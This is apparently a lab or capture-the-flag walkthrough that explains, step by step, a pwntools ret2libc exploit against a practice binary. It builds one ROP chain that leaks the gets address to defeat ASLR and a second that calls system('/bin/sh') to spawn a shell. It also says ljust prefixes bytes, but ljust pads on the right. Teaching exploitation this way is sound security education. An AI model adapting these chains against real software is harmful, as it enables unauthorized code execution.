# General/ret2lib
```text-plain
context.binary = binary = './exploit_me'
elf = ELF(binary)
rop = ROP(elf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()
```

On the first line, we're assigning the exploit\_me binary into the binary variable and then adding this binary to the context. Context is a global variable that automatically sets settings (like architecture, operating system, bit-width) for our binary. So later, when we'll use our binary variable, we don't have to specify every setting manually. On the next line, we're creating a variable called `elf` so that we can manipulate it with our binary as an ELF object inside of our script. Once the variable has been created, we use that `elf` variable to create an ROP object called `rop`. We'll use both of these variables later in the code.

Next, we're creating a variable called `libc` and assigning the full path of libc to it. Our binary will be using libc as an ELF object. If you don't know how to find which libc our binary is using, you can do that with the command ldd: `ldd exploit_me`

The last thing we're doing is spawning our binary as a process. You can see that we didn't specify which process to spawn; that's because we added our binary into the context. Now we'll start creating the ROP chain to leak the gets function.

```text-plain
padding = b'A'*18
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)
```

Now we have everything ready to start the first ROP chain to leak the libc base address.

In the ROP chain, the first thing we do is create the variable `payload` and assign our overflow offset (=padding) to it. 

The basic logic of the ROP leak chain is as follows:

1.  Popping the **$RDI** register for our argument
2.  Filling the **$RDI** register with the address of the gets function
3.  Executing the puts function with loaded argument
4.  Returning to the main program with already leaked function

Now let's break down every function in this part so you can fully understand what is going on.

`p64()`

*   Returns the byte string from the data passed in the argument.

`rop.find_gadget(['pop rdi', 'ret'])[0])`

*   Returns an array of all addresses in memory where the instructions \['pop rdi', 'ret'\] occur, and since we only need the first one, we specify \[0\] for the first value in the array.

`elf.got.gets`

*   Returns the address of the gets functions from the .got.plt section, which we discussed in the previous task.

`elf.plt.puts`

*   Returns the address of the puts function from the .plt section.

`elf.symbols.main`

*   Returns the address of the main function.

`u64()`

*   So with this function, we're unpacking the byte string. But here comes one little problem, which is solved by the next function.

`ljust(8,b'\0'))`

*   One issue here is that the `u64()` function cannot unpack a byte string that isn't precisely 64 bits long (=8 bytes). Since our address doesn't come in this size, padding is required.
*   This padding is done by adding additional null bytes (before we unpack it) to the beginning of the string so that we have a byte string that is exactly 64 bits (=8 bytes) long.
*   The first argument is the final length of the byte string. In our case, it's 8.
*   The second argument is the byte that is being prefixed until the byte string is exactly 8 bytes long. In our case, it's the null byte.

`strip()`

*   At the end of our byte string is the new line character **\\n**, which we want to get rid of, and the strip function does exactly that.

`p.recvline()`

*   Is just reading the initial byte string.

```text-plain
log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')
```

*   Imagine our leak as some address that changes every time. The only thing that we know about it is that this address belongs to the gets function. We want to calculate the base address of the libc, which will also be different every time.
*   But now comes the interesting part. The range between the base address and the gets function is always the same. And since we can treat addresses like numbers, we can just subtract the address of the gets function from our leak.
*   This gives us the base address of the currently linked libc, and we print this value out to check if we've done everything correctly.
*   We know everything is correct when the base address ends with three 0's.

Now when we have figured out how to evade ASLR protection, we can continue with the actual ret2libc exploit.

```text-plain
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)
```

The basic logic of the "spawn shell" ROP chain:

1.  Popping the **$RDI** register for our argument.
2.  Filling the **$RDI** register with the byte string "/bin/sh".
3.  Ret instruction is for the stack alignment (just think of this as something that we need to do; otherwise, some problems may occur).
4.  Executing the system function with a loaded argument.

`libc.search(b'/bin/sh')` 

*   Returns the iterator for each virtual address that matches the byte string "/bin/sh".

`next()` 

*   Function returns the "next" iterator from the founded matches.

`libc.symbols.system`

*   Returns the address of the system function inside of our linked libc.
*   Since we initially defined the libc variable as an ELF object and later rebased this libc with our first ROP chain, we can now call the system function right from the libc.